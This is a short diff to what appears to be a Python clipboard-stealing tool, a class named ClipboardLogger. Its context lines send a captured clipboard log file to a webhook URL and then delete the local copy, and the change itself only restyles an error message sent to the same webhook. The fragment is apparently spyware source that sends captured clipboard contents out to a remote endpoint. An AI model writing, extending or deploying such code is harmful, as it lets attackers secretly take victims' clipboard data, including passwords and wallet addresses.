@@ -28,7 +28,7 @@ class ClipboardLogger:
             send_webhook(self.webhook_url, file={"clipboard_logs.txt": open(self.log_file, "rb")})
             os.remove(self.log_file)
         except Exception as e:
-            send_webhook(self.webhook_url, f"Error logging clipboard: {e}")
+            send_webhook(self.webhook_url, f"```❌ Error logging clipboard: {e}```")
 
     def start(self):
         while True:
